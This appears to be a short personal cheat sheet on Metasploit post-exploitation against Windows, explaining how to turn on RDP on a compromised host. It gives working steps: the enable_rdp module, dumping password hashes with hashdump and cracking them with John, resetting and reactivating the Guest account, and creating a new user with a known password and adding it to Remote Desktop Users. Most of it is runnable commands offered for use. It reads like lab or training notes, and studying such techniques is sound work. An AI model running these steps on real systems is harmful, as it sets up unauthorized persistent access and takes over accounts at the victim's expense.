# Metasploit - RDP Connection

Want to enable RDP in post exploitation. First check if `ms-wbt-server` is running at 3389 on the target. If not, find a way to exploit first, get a meterpreter, put the session to background, and use the post-exploitation module `post/windows/manage/enable_rdp` to enable RDP server (configure session to the meterpreter session). 

There are couple of options from here. 

### Option 1, crack user passwords
on meterpreter, `hashdump` to get user acounts and ther hashes (need escalted privilege), and crack with a tool like John

### Option 2, alter the password of an existing user account in remote access group

Get a windows cmd `shell` 

check who are in the remote log on list
```
net localgroup "Remote Desktop Users"
```

to change password
```
net user Guest newpassword
```

If it says "account disabled, please see the administrator", run 
```
net user Guest /active:yes
```

### Option 3, make a new user account
```
net user test imthepassword /add
```
![rdp-logon](https://user-images.githubusercontent.com/39619599/118205501-7804ae00-b42e-11eb-9674-04b7207a026f.png)

Now, add the user account to the remote desktop user list
```
net localgroup "Remote Desktop Users" "test" /add
```

... et voila

<img src="https://user-images.githubusercontent.com/39619599/118205515-7e932580-b42e-11eb-8edd-9a7a0758081a.png" width=50%>
